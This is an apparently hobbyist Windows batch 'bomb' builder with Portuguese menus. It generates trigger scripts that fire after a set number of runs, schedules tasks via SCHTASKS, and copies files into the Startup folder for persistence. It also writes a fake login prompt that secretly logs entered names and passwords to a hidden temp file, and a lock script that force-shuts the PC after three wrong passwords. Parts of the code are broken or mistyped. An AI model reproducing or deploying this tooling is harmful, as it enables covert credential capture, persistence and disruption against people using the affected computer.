echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p fg=
if %fg% equ TR goto traf
if %fg% equ A goto 7A
if %fg% equ B goto 15B
if %fg% equ RL goto RL
if %fg% equ COPY goto copy
if %fg% equ C goto 30C
if %fg% equ V goto MENU
if %fg% equ COPY goto copy

echo MsgBox " CAPS LOOK DESLIGADO COMANDO [ %fg% ] NรO ACEITO  ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto bomb2
:7A
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    7 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto bm
)
cls
goto mk
:15B
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    15 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto 15B
)
cls
goto mk
:30C
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    30 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto 30C
)
cls
:mk
@ echo off
echo @echo off >> "%bm%".cmd
echo  if exist lig1.drv goto 2 >> "%bm%".cmd
echo  echo ^> lig1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist lig2.drv goto 3 >> "%bm%".cmd
echo  echo ^> lig2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist lig3.drv goto 4 >> "%bm%".cmd
echo  echo ^> lig3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist lig4.drv goto 5 >> "%bm%".cmd
echo  echo ^> lig4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist lig5.drv goto 6 >> "%bm%".cmd
echo  echo ^> lig5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist lig6.drv goto 7 >> "%bm%".cmd
echo  echo ^> lig6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist lig7.drv goto 8 >> "%bm%".cmd
echo  echo ^> lig7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
if %fg% equ A echo  : fim >> "%bm%".cmd
if %fg% equ A echo  exit >> "%bm%".cmd
if %fg% equ A echo :8 >> "%bm%".cmd
if %fg% equ A echo  del *.drv >> "%bm%".cmd
if %fg% equ A goto result
echo  :8 >> "%bm%".cmd
echo  if exist lig8.drv goto 9 >> "%bm%".cmd
echo  echo ^> lig8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist lig9.drv goto 10 >> "%bm%".cmd
echo  echo ^> lig9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist lig10.drv goto 11 >> "%bm%".cmd
echo  echo ^> lig10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo  if exist lig11.drv goto 12 >> "%bm%".cmd
echo  echo ^> lig11.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist lig12.drv goto 13 >> "%bm%".cmd
echo  echo ^> lig12.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist lig13.drv goto 14 >> "%bm%".cmd
echo  echo ^> lig13.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist lig14.drv goto 15 >> "%bm%".cmd
echo  echo ^> lig14.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist lig15.drv goto 16 >> "%bm%".cmd
echo  echo ^> lig15.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
if %fg% equ B echo  : fim >> "%bm%".cmd
if %fg% equ B echo  exit >> "%bm%".cmd
if %fg% equ B echo :16 >> "%bm%".cmd
if %fg% equ B echo  del *.drv >> "%bm%".cmd
if %fg% equ B goto result
echo  :16 >> "%bm%".cmd
echo  if exist lig16.drv goto 17 >> "%bm%".cmd
echo  echo ^> lig16.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :17 >> "%bm%".cmd
echo  if exist lig17.drv goto 18 >> "%bm%".cmd
echo  echo ^> lig17.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :18 >> "%bm%".cmd
echo  if exist lig18.drv goto 19 >> "%bm%".cmd
echo  echo ^> lig18.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :19 >> "%bm%".cmd
echo  if exist lig19.drv goto 20 >> "%bm%".cmd
echo  echo ^> lig19.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :20 >> "%bm%".cmd
echo  if exist lig20.drv goto 21 >> "%bm%".cmd
echo  echo ^> lig20.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :21 >> "%bm%".cmd
echo  if exist lig22.drv goto 23 >> "%bm%".cmd
echo  echo ^> lig22.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :23 >> "%bm%".cmd
echo  if exist lig23.drv goto 24 >> "%bm%".cmd
echo  echo ^> lig23.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :24 >> "%bm%".cmd
echo  if exist lig24.drv goto 25 >> "%bm%".cmd
echo  echo ^> lig24.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :25 >> "%bm%".cmd
echo  if exist lig25.drv goto 26 >> "%bm%".cmd
echo  echo ^> lig25.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :26 >> "%bm%".cmd
echo  if exist lig26.drv goto 27 >> "%bm%".cmd
echo  echo ^> lig26.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :27 >> "%bm%".cmd
echo  if exist lig27.drv goto 28 >> "%bm%".cmd
echo  echo ^> lig27.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :28 >> "%bm%".cmd
echo  if exist lig28.drv goto 29 >> "%bm%".cmd
echo  echo ^> lig28.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :29 >> "%bm%".cmd
echo  if exist lig29.drv goto 30 >> "%bm%.cmd
echo  echo ^> lig29.drv sdfsdf >> "%bm%.cmd
echo  goto fim >> "%bm%".cmd
echo  :30 >> "%bm%".cmd
echo  if exist lig30.drv goto 31 >> "%bm%".cmd
echo  echo ^> lig30.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  : fim >> "%bm%".cmd
echo  exit >> "%bm%".cmd
echo  :31 >> "%bm%".cmd
echo  del *.drv >> "%bm%".cmd
:result
cls
echo MsgBox "DIGITE UM COMANDO PRA SEU CำDIGO ACIONA-LO",vbOKOnly + vbInformation, "CำDIGO INCOMPLETO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITAR CODIGO  (A )
echo.
echo    PROSEGUIR       ( B )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p cod=  
if %cod% equ A goto dig
if %cod% equ B goto end
goto result

:dig

cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE SEU CODIGO  
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p co=  DIGITE ENTER PARA COMEวAR SEU CODIGO
:texty
set /p maistxt=:

if "%maistxt%"=="%maistxt%" echo %maistxt% >> "%bm%".cmd
goto texty

:end
goto bomb2

=========== TAREFA AGENDADA===============


:traf
CLS
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE A QUANTIDADE DE MINUTOS 
echo.
echo     PARA A ATIVACAO DO ARQUIVO
echo.
echo    EXEMPLO ( 1 ) OU ( 2,3,4.....)
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p m=

CLS


echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO RELOGIO
echo.
echo     PARA AGENDA-LO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p NOM=

echo @ echo off > %NOM%.cmd
echo cd /d %%~dp0 >>%NOM%.cmd
echo SCHTASKS /create /sc minute /mo %m% /tn %NOM% /tr >> %NOM%.cmd
echo DEL %NOM%.cmd >> %NOM%.cmd
goto bomb2


::=====RELOGIO===========================



:RL
TITLE CRIAR RELOGIO COM DISPARADORES
Color A
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    CRIAR RELOGIO COM DISPARADORES ( CRIAR )
echo.
echo    PARA VOLTAR PARA INICIO DIGITE  ((  v  ))
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p fg=
if %fg% equ CRIAR goto MK
if %fg% equ V goto bomb2
echo MsgBox " CAPS LOOK DESLIGADO COMANDO [ %fg% ] NรO ACEITO  ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto RL
:MK
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo DIGITE O NOME DE SEU RELOGIO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm= 

@ echo off
::=============================
:: seg/drv
::=============================
echo @echo off >> "%bm%".cmd
echo mode 20,5 >> "%bm%".cmd
echo :DE >> "%bm%".cmd
echo ping 127.0.0.1 -n 2 > nul >> "%bm%".cmd
echo  if exist seg1.drv goto 2 >> "%bm%".cmd
echo  echo ^> seg1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist seg2.drv goto 3 >> "%bm%".cmd
echo  echo ^> seg2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist seg3.drv goto 4 >> "%bm%".cmd
echo  echo ^> seg3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist seg4.drv goto 5 >> "%bm%".cmd
echo  echo ^> seg4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist seg5.drv goto 6 >> "%bm%".cmd
echo  echo ^> seg5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist seg6.drv goto 7 >> "%bm%".cmd
echo  echo ^> seg6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist seg7.drv goto 8 >> "%bm%".cmd
echo  echo ^> seg7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :8 >> "%bm%".cmd
echo  if exist seg8.drv goto 9 >> "%bm%".cmd
echo  echo ^> seg8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist seg9.drv goto 10 >> "%bm%".cmd
echo  echo ^> seg9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist seg10.drv goto 11 >> "%bm%".cmd
echo  echo ^> seg10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo del *.drv >> "%bm%".cmd
::=============================
:: min/.vbs
::=============================
echo  if exist min11.vbs goto 12 >> "%bm%".cmd
echo  echo ^> min11.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist min12.vbs goto 13 >> "%bm%".cmd
echo  echo ^> min12.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist min13.vbs goto 14 >> "%bm%".cmd
echo  echo ^> min13.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist min14.vbs goto 15 >> "%bm%".cmd
echo  echo ^> min14.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist min15.vbs goto 16 >> "%bm%".cmd
echo  echo ^> min15.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :16 >> "%bm%".cmd
echo  if exist min16.vbs goto 17 >> "%bm%".cmd
echo  echo ^> min16.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :17 >> "%bm%".cmd
echo  if exist min17.vbs goto 18 >> "%bm%".cmd
echo  echo ^> min17.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :18 >> "%bm%".cmd
echo  if exist min18.vbs goto 19 >> "%bm%".cmd
echo  echo ^> min18.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :19 >> "%bm%".cmd
echo  if exist min19.vbs goto 20 >> "%bm%".cmd
echo  echo ^> min19.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :20 >> "%bm%".cmd
echo  if exist min20.vbs goto 21 >> "%bm%".cmd
echo  echo ^> min20.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :21 >> "%bm%".cmd 
echo  del *.vbs >> "%bm%".cmd
::==============================
:: hour/.hlp
::==============================
echo  if exist hour22.hlp goto 23 >> "%bm%".cmd
echo  echo ^> hour22.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :23 >> "%bm%".cmd
echo  if exist hour23.hlp goto 24 >> "%bm%".cmd
echo  echo ^> hour23.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :24 >> "%bm%".cmd
echo  if exist hour24.hlp goto 25 >> "%bm%".cmd
echo  echo ^> hour24.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :25 >> "%bm%".cmd
echo  if exist hour25.hlp goto 26 >> "%bm%".cmd
echo  echo ^> hour25.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :26 >> "%bm%".cmd
echo  if exist hour26.hlp goto 27 >> "%bm%".cmd
echo  echo ^> hour26.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :27 >> "%bm%".cmd
echo  if exist hour27.hlp goto 28 >> "%bm%".cmd
echo  echo ^> hour27.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :28 >> "%bm%".cmd
echo  if exist hour28.hlp goto 29 >> "%bm%".cmd
echo  echo ^> hour28.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :29 >> "%bm%".cmd
echo  if exist hour29.hlp goto 30 >> "%bm%.cmd
echo  echo ^> hour29.hlp sdfsdf >> "%bm%.cmd
echo  goto fim >> "%bm%".cmd
echo  :30 >> "%bm%".cmd
echo  if exist hour30.hlp goto 31 >> "%bm%".cmd
echo  echo ^> hour30.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  : fim >> "%bm%".cmd
echo  goto DE >> "%bm%".cmd
echo  :31 >> "%bm%".cmd
echo  del *.hlp >> "%bm%".cmd

echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo  QUER INSERIR COMANDOS AO RELOGIO
echo.
echo     S =SIM
echo.
echo     N = NAO
echo.
echo.    C = CANCELAR
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
choice /C SNC /N /CS /T 20 /D N /M "  A€วO OU ESTRATGIA  "
 IF errorlevel = S goto dig
 IF errorlevel = N goto bomb2
 IF errorlevel = C goto end

::ABC=OPวีES 
::/N=OCULTA AS OPวีES
::/CS=DIFERENCIA MAIUSCULA DE MINUSCULA
::/T=TEMPO
::/D=OPวรO ESCOLHIDA PRA ACIONAR DEPOIS DO TEMPO ESCOLHIDO
::/M=MENSAGEM



echo MsgBox "ARQUIVO [ %bm% ] CRIADO COM SUCESSO",vbOKOnly + vbInformation, "CำDIGO INCOMPLETO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto result


:copy


CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    COPIAR PARA PASTA TEMPORARIA (TEMP )
echo.
echo    COPIAR PARA PASTA INICIAR ( INI )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ps=
if %ps% equ TEMP goto tp
if %ps% equ INI goto TP2

echo MsgBox "CAPS LOOK DESLIGADO [ %bm% ] MINฺSCULO NรO ACEITO",vbOKOnly + vbInformation, "CำDIGO MINฺSCULO" >%temp%\wyz.vbs
start %temp%\wyz.vbs

goto copy
:tp
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    COPIAR PARA A PASTA TEMPORARIA
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO ARQUIVO OU
echo.
echo     ARRASTE O ARQUIVO P/ JANELA
echo.
set /p tp=

xcopy %tp% %temp%
goto bomb2

:TP2
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    COPIAR PARA A PASTA INICIAR
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO ARQUIVO OU
echo.
echo     ARRASTE O ARQUIVO P/ JANELA
echo.
set /p in=

xcopy %in% "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
goto bomb2


::==============================================================================================
::====================================ALGORITIMO DE SENHA   ====================================
::==============================================================================================
:ALG
CLS
ECHO ========================================
ECHO              CHOICE THE MODEL
ECHO ========================================
ECHO.
ECHO  ( 1 )SIMPLES
ECHO.
ECHO  ( 2 )ELABORADA
ECHO.
ECHO  ( 3 )COM ASTERISCOS
ECHO.
ECHO  ( 4 )MENU PRINCIPAL
 
choice /C 1234 /N /CS
 IF errorlevel = 4 goto menu 
 IF errorlevel = 3 goto asterisco
 IF errorlevel = 2 goto elaborada
 IF errorlevel = 1 goto simples
:simples







got ALG
:elaborada
echo @echo off >C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo attrib -h %%temp%%\login.txt >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo attrib -h EditV64.exe >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo MODE 35,5 >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo color 3f >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo set /p nome="Imforme seu nome: " >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo. >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo EditV64 -p "Informe sua senha: " -m senha >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo. >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo echo Nome: %%nome%% >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo. >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo echo Senha:%%senha%% >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo echo DATA: %%date:~0,2%%/%%date:~3,2%%/%%date:~ 6,10%% HORA: %%time:~0,2%%:%%time:~3,2%% ^>^>%%temp%%\login.txt >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo echo NOME:%%nome%% SENHA: %%senha%% ^>^>%%temp%%\login.txt >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo echo ________________________________ ^>^>%%temp%%\login.txt >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo attrib +h %%temp%%\login.txt >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
echo attrib +h EditV64.exe >>C:\Users\%Username%\Desktop\algoritimo_de_senha.cmd
copy /d EditV64.exe C:\Users\%Username%\Desktop
attrib +h C:\Users\%Username%\Desktop\EditV64.exe


@ echo off
:: CODIGO FONTE DA TELA DE LOGIN
color 0A
mode 70,10
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo      DIGITE UM NOME PARA O ARQUIVO A SER GERADO
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo.
set /p ARK=ARQUIVO A SER GERADO= 
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo      NOME DO ARQUIVO OU PASTA 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo.
set /p des=ARQUIVO A SER PROTEGIDO= 
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    SENHA PARA PROTEGER O ARQUIVO OU A PASTA 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
EditV64 -p "DIGITE SUA SENHA: " -m pass 
echo @echo off >C:\Users\%Username%\Desktop\%ARK%.CMD
echo mode 35,3 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo color 0A >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo title Digite a sua senha.... >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo EditV64 -p "DIGITE SUA SENHA: " -m senha >>C:\Users\%Username%\Desktop\%ARK%.CMD 
echo if %%senha%% == %pass% goto 1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo echo MsgBox "SENHA [ %%senha%% ] ERRADA ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" ^>%%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD  
echo start %%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo goto e1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo :e1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo cls >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo EditV64 -p "DIGITE SUA SENHA: " -m senha >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo if %%senha%% == %pass% goto 1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo echo MsgBox "SENHA [ %%senha%% ] ERRADA VOCส NรO ษ WYZARD",vbOKOnly + vbExclamation, "PERIGO" ^>%%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD   
echo start %%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo goto e2 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo :e2 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo cls >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo EditV64 -p "DIGITE SUA SENHA: " -m senha >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo if %%senha%% == %pass% goto 1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo echo MsgBox "VOCส FOI DESCONECTADO",vbOKOnly + vbExclamation, "PERIGO" ^>%%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD  
echo start %%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo goto e3 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo. >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo :e3 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo shutdown -s -f -t 00 >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo exit >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo :1 >>C:\Users\%Username%\Desktop\%ARK%.CMD
ECHO. >>C:\Users\%Username%\Desktop\%ARK%.CMD.
::echo echo MsgBox "PARABENS SENHA CORRETA",vbOKOnly + vbExclamation, "PERIGO" ^>%%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD  
::echo start %%temp%%\wyz.vbs >>C:\Users\%Username%\Desktop\%ARK%.CMD
echo %des% >>C:\Users\%Username%\Desktop\%ARK%.CMD
if not exist EditV64.exe
copy /d EditV64.exe C:\Users\%Username%\Desktop
attrib +h C:\Users\%Username%\Desktop\EditV64.exe
goto ALG


:asterisco
cls
::==============================================================================================
::================================== SENHA COM ASTERISCO                  ========================
::==============================================================================================

@echo off

echo Digite sua senha:

:loop
for /f "delims=" %%# in ('xcopy /w "%~f0" "%~f0" 2^>nul') do if not defined key (set "key=%%#")

if "%key:~-1%" == "" goto fim

if not "%key:~-1%"=="" (
	set "loop=%loop%%key:~-1%"
	set /p "=*" <nul
) else (
	if not "%loop%"=="" set "loop=%loop:~0,-1%"
	set /p "= " <nul
)

set key=
goto loop

:fim
cls
echo Sua senha e: %loop%
pause>nul
cls
echo criar o script sim [S] ou nao [N]
choice /C sn /N /CS 
 IF errorlevel = 2 goto ALG
 IF errorlevel = 1 goto s

:s
ECHO @echo off >>SCRIP_SENHA.BAT
ECHO echo Digite sua senha: >>SCRIP_SENHA.BAT
ECHO :loop >>SCRIP_SENHA.BAT
ECHO for /f "delims=" %%# in ('xcopy /w "%~f0" "%~f0" 2^>nul') do if not defined key (set "key=%%#") >>SCRIP_SENHA.BAT
ECHO if "%key:~-1%" == "" goto fim >>SCRIP_SENHA.BAT
ECHO if not "%key:~-1%"=="" ( >>SCRIP_SENHA.BAT
ECHO 	set "loop=%loop%%key:~-1%" >>SCRIP_SENHA.BAT
ECHO 	set /p "=*" <nul >>SCRIP_SENHA.BAT
ECHO ) else ( >>SCRIP_SENHA.BAT
ECHO 	if not "%loop%"=="" set "loop=%loop:~0,-1%" >>SCRIP_SENHA.BAT
ECHO 	set /p "= " <nul >>SCRIP_SENHA.BAT
ECHO ) >>SCRIP_SENHA.BAT
ECHO set key= >>SCRIP_SENHA.BAT
ECHO goto loop >>SCRIP_SENHA.BAT
ECHO :fim >>SCRIP_SENHA.BAT
ECHO cls >>SCRIP_SENHA.BAT
ECHO echo Sua senha e: %loop% >>SCRIP_SENHA.BAT
ECHO pause>nul >>SCRIP_SENHA.BAT
cls


GOTO ALG
::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



::==============================================================================================
::==================================                                    ========================
::==============================================================================================



